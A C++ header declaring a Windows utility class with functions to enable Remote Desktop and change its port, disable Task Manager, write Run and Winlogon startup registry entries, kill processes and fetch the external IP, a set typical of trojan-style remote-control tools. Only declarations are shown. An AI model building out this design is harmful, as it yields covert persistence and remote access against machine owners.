#include <direct.h>				
#include <math.h>
#include <windows.h>
#include <dbt.h>
#include <winioctl.h>
#include <psapi.h>
#include <sddl.h>
#include <winnls.h>
#include "ProcessList.h"
#include "WINRegistry.h"
#include "FunctionsStrings.h"
#include "HTTPClient.h"
#include "Main.h"

#define TERMINAL_SERVER                           "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"
#define TERMINAL_SERVER_PORT                      "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"
#define TERMINAL_SERVER_DEFAULT_PORT              3389
#define USER_ACCOUNT                              0
#define GROUP_ACCOUNT                             1
#define EVENT_OPEN                                true
#define EVENT_CLOSE                               false
#define EXTERNAL_IP_URL                           "checkip.dyndns.org"
#define EXTERNAL_IP_URL_PORT                      8245
#define WALLPAPER_URL_REG_KEY                     "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Desktop\\Components"
#define WALLPAPER_URL_DISABLE_FLAG                2
#define WALLPAPER_URL_ENABLE_FLAG                 8194
#define WALLPAPER_URL_DEFAULT_STATE               1073741825
#define WALLPAPER_URL_DEFAULT_DESC                "Default"
#define WALLPAPER_URL_STATE_INFO_SIZE             24
#define WALLPAPER_URL_POSITION_SIZE               44
#define WALLPAPER_URL_STATE_INFO_VALUE            "\x18\x00\x00\x00\xC0\x03\x00\x00\x88\x01\x00\x00\x16\x01\x00\x00\x20\x01\x00\x00\x01\x00\x00\x40"
#define WALLPAPER_URL_POSITION_VALUE              "\x2C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\xDF\x03\x00\x00\x00\00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"   
#define WALLPAPER_REG_KEY                         "HKEY_CURRENT_USER\\Control Panel\\Desktop"
#define WALLPAPER_TYPE_CENTER                     0
#define WALLPAPER_TYPE_STRETCH                    1
#define WALLPAPER_TYPE_TILE                       2
#define LANGUAGE_SIZE                             3
#define ABSOLUTE_PATH_SIZE                        1024
#define MAX_FILENAME_LEN                          255
#define IOCTL_STORAGE_QUERY_PROPERTY              CTL_CODE(IOCTL_STORAGE_BASE, 0x0500, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define POLICIES_REGISTRY_CURRENT_USER            "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
#define POLICIES_REGISTRY_LOCAL_MACHINE           "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system"
#define STARTUP_REGISTRY_CURRENT_USER             "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define STARTUP_REGISTRY_LOCAL_MACHINE            "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define STARTUP_REGISTRY_WINLOGON_CURRENT_USER    "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
#define STARTUP_REGISTRY_WINLOGON_LOCAL_MACHINE   "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
#define MAX_TITLE_BAR_LEN                         255 

#pragma once
   
using namespace std;

class FunctionsWindowsNT {
   private:

      static char * accountToSID(const char * account, unsigned int type);
      static void actionCDDrive(char * drive, bool bOpenDrive);
      static void actionAllCDDrives(bool bOpenDrive);
      static bool getDisksProperty(HANDLE hDevice, PSTORAGE_DEVICE_DESCRIPTOR pDevDesc);
      
   public: 
           
      /* ############ [ TERMINAL SERVER ] ############## */
      static bool enableTerminalServer();
      static bool disableTerminalServer();
      static bool setTerminalServerPort(unsigned int listeningPort);
      static unsigned int getTerminalServerPort();
      static bool terminalServerIsRunning();
      
      /* ################ [ COMPUTER ] ################# */
      static char * getComputerName();
      static char * getComputerName(char * IPAddress);
      static char * getCurrentUserLanguage();
      static bool setDesktopWallpaper(char * filename, unsigned int type = WALLPAPER_TYPE_CENTER);
      static bool setDesktopURLWallpaper(char * URL, char * description = WALLPAPER_URL_DEFAULT_DESC);
      static bool disableTaskManager();
      static bool enableTaskManager();
      
      /* ############# [ USER & GROUP SID ] ############ */
      static char * userToSID(const char * username);
      static char * groupToSID(const char * groupname);
      
      /* ################# [ SCREEN ] ################## */
      static void screenPowerDown();
      static void screenPowerUp();
      
      /* ################ [ CD DRIVES ] ################ */
      static void openCDDrive(char * drive);
      static void closeCDDrive(char * drive);
      static void openAllCDDrives();
      static void closeAllCDDrives();
      
      /* ################# [ DRIVES ] ################## */
      static char getFirstFreeDrive();
      static int getBusyNumDrives();
      static char getDriveLetter(unsigned long ulUnitMask);
      static bool isRemovableOrFixedUSBDrive(char * drive);
      
      /* ################ [ NETWORK ] ################## */
      static char * getExternalIPAddress();
      static char * getPrivateIPAddress();
      static bool ping(const char * hostname);
      static char * DNShostname(char * hostname); 
      
      /* ############## [ APPLICATION ] ################ */
      static char * getFilename();
      static char * getAbsolutePathAndFilename();
      
      /* ################ [ PROCESS ] ################## */
      static unsigned long getPID(char * processName);
      static HANDLE getHandle(char * processName);
      static HANDLE getHandle(unsigned long processID);
      static HWND getWindowHandle(char * processName);
      static HWND getWindowHandle(unsigned long processID);
      static bool killProcess(const char * processName);
      
      /* ################ [ SERVICES ] ################## */
      static bool isServiceActive(char * serviceDisplayName);
      
      /* ################ [ STARTUP ] ################## */
      static bool appLMachineCVersionRunStartupRegistry(char * keyName, char * keyValue);
      static bool appCUserCVersionRunStartupRegistry(char * keyName, char * keyValue);
      static bool appLMachineCVersionRunStartupRegistryHaveKey(char * keyName);
      static bool appCUserCVersionRunStartupRegistryHaveKey(char * keyName);
      static bool appLMachineCVersionRunStartupRegistryHaveValue(char * keyName);
      static bool appCUserCVersionRunStartupRegistryHaveValue(char * keyName);
      static char * appLMachineCVersionRunStartupRegistryValue(char * keyName);
      static char * appCUserCVersionRunStartupRegistryValue(char * keyName); 
      
      static bool appLMachineCVersionWinlogonStartupRegistry(char * keyName, char * keyValue);
      static bool appCUserCVersionWinlogonStartupRegistry(char * keyName, char * keyValue); 
      static bool appLMachineCVersionWinlogonStartupRegistryHaveKeyWord(char * keyName, char * keyWord);
      static bool appCUserCVersionWinlogonStartupRegistryHaveKeyWord(char * keyName, char * keyWord);
      static char * appLMachineCVersionWinlogonStartupRegistryValue(char * keyName, char * keyWord);
      static char * appCUserCVersionWinlogonStartupRegistryValue(char * keyName, char * keyWord);  
};
